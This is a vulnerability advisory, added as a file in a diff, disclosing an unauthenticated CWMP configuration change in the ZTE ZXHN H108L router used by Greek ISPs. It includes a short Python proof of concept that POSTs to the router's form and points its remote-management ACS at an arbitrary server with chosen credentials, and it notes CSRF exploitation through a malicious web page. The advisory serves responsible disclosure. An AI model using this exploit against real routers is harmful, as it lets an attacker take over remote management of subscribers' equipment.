@@ -1,0 +1,71 @@
+About the software
+==================
+
+ZTE ZXHN H108L is provided by some large Greek ISPs to their subscribers.
+
+Vulnerability Details
+=====================
+
+CWMP configuration is accessible only through the Administrator account. CWMP is a protocol widely used by ISPs worldwide for remote provisioning and troubleshooting their subscribers' equipment. However editing the CWMP configuration (more specifically sending the POST request) does not require any user authentication.
+
+Affected Products
+=================
+Device model : ZTE ZXHN H108L
+Firmware Version : ZXHN H108LV4.0.0d_ZRQ_GR4
+
+Proof of Concept
+================
+
+#!/usr/bin/python
+
+import requests
+
+acs_server = "http://<server>:<port>"
+acs_user = "user"
+acs_pass = "pass"
+
+# Connection request parameters. When a request is made to the following URL, using the specified user/pass combination,
+# router will connect back to the ACS server.
+
+conn_url = "/tr069"
+conn_port = "7564"
+conn_user = "user"
+conn_pass = "pass"
+
+#Periodic inform parameters
+active = 1
+interval = 2000
+
+payload = {'CWMP_active': '1', 'CWMP_ACSURL': acs_server,'CWMP_ACSUserName': acs_user,'CWMP_ACSPassword': acs_pass, 'CWMP_ConnectionRequestPath': conn_url, 'CWMP_ConnectionRequestPort': conn_port, 'CWMP_ConnectionRequestUserName': conn_user, 'CWMP_ConnectionRequestPassword': conn_pass, 'CWMP_PeriodActive': active, 'CWMP_PeriodInterval': interval, 'CWMPLockFlag': '0' }
+
+r = requests.post("http://192.168.1.254/Forms/access_cwmp_1", data=payload)
+
+Impact
+======
+
+The described vulnerability allows any unauthenticated user to edit the CWMP configuration. Exploitation can be performed by LAN users or through the Internet if the router is configured to expose the web interface to WAN. Also because the router lacks of CSRF protection, malicious JS code can be deployed in order to exploit the vulnerability through a  malicious web page.
+
+Severity
+========
+
+Medium
+
+References
+==========
+
+https://projectzero.gr/en/2014/11/zte-zxhn-h108l-authentication-bypass/
+
+
+Disclosure Timeline
+===================
+
+27/10/2014 - First communication attempt to both vendor and ISP
+04/11/2014 - ZTE response states that ISP should be contacted
+03/11/2014 - Second attempt to contact the ISP.
+14/11/2014 - No response from ISP. Public Disclosure
+
+Contact Information
+===================
+Domain:    https://projectzero.gr
+Social:    twitter.com/projectzerolabs
+Contact:    labs _at_ projectzero.gr
